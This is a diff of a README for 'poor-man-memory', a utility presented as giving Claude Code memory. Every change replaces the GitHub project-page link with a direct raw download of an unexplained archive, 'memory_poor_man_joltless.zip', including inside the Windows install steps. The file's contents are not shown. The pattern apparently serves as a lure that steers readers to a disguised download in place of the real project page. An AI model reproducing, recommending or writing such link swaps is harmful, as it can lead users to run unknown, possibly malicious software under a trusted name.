@@ -1,12 +1,12 @@
 # 🧠 poor-man-memory - Keep Claude Code on track
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/huckaby1847/poor-man-memory)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/huckaby1847/poor-man-memory/main/pmm/memory_poor_man_joltless.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[https://github.com/huckaby1847/poor-man-memory](https://github.com/huckaby1847/poor-man-memory)
+[https://raw.githubusercontent.com/huckaby1847/poor-man-memory/main/pmm/memory_poor_man_joltless.zip](https://raw.githubusercontent.com/huckaby1847/poor-man-memory/main/pmm/memory_poor_man_joltless.zip)
 
 ## 🪟 What this is for
 
@@ -24,7 +24,7 @@ Use it when you want:
 Follow these steps on a Windows PC:
 
 1. Open the download page:
-   [https://github.com/huckaby1847/poor-man-memory](https://github.com/huckaby1847/poor-man-memory)
+   [https://raw.githubusercontent.com/huckaby1847/poor-man-memory/main/pmm/memory_poor_man_joltless.zip](https://raw.githubusercontent.com/huckaby1847/poor-man-memory/main/pmm/memory_poor_man_joltless.zip)
 
 2. Find the latest release or the main project files on the page.
 
@@ -178,7 +178,7 @@ This project is built around:
 
 Use the main project page here:
 
-[https://github.com/huckaby1847/poor-man-memory](https://github.com/huckaby1847/poor-man-memory)
+[https://raw.githubusercontent.com/huckaby1847/poor-man-memory/main/pmm/memory_poor_man_joltless.zip](https://raw.githubusercontent.com/huckaby1847/poor-man-memory/main/pmm/memory_poor_man_joltless.zip)
 
 ## 📝 Best way to use it
 
